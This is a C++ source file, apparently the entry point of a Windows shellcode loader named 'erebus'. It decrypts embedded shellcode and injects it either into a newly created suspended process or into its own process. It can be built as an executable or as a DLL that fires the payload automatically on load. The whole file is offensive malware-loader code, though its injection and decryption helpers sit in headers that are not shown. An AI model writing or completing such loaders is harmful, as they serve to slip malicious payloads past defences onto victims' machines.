#include "../include/shellcode.hpp"
#include "../include/loader.hpp"
// #include "../include/config.hpp" # Already imported in loader.hpp

// =========================================================================
// ENTRY POINT
// =========================================================================
VOID entry(void)
{
	// 1. Configure Injection Method based on Config
	erebus::config.injection_method = ExecuteShellcode;
	erebus::config.decryption_method = DecryptShellcode;

	HANDLE process_handle = NULL;
	HANDLE thread_handle = NULL;

	// Start with the raw shellcode from the header
	SIZE_T shellcode_size = sizeof(shellcode);
	if (shellcode_size == 0) return;

	// ============================================================
	// 0. PREPARE MEMORY
	// ============================================================
	// Copy to Heap for Safe Decryption (Avoids Read-Only Access Violations)
	unsigned char* pPayload = (unsigned char*)malloc(shellcode_size);
	if (!pPayload) return; // Allocation failed

	// Copy raw shellcode to heap
	memcpy(pPayload, shellcode, shellcode_size);

	// ============================================================
	// 1. DECRYPT (Main handles Key)
	// ============================================================

	if (sizeof(key) > 0 && key[0] != 0x00 && CONFIG_ENCRYPTION_TYPE != 0) {
		erebus::config.decryption_method(pPayload, shellcode_size, key, sizeof(key));
	}

	// ============================================================
	// 2. TARGET PROCESS SETUP
	// ============================================================
#if CONFIG_INJECTION_MODE == 1
	// Remote Injection
	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
	if (!erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle)) {
		free(pPayload);
		return;
	}
#elif CONFIG_INJECTION_MODE == 2
	// Local Injection
	process_handle = NtCurrentProcess();
	thread_handle = NtCurrentThread();
#endif

	// ============================================================
	// 3. INJECT (Loader handles Decompression + Writing)
	// ============================================================
	erebus::config.injection_method(pPayload, shellcode_size, process_handle, thread_handle);

	// Cleanup
	memset(pPayload, 0, shellcode_size);
	free(pPayload);

	return;
}

// =========================================================================
// STANDARD ENTRY POINTS
// =========================================================================

#if _DEBUG
int main()
{
	entry();
	return 0;
}

#elif _WINDLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		entry();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

#else
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	entry();
	return 0;
}
#endif
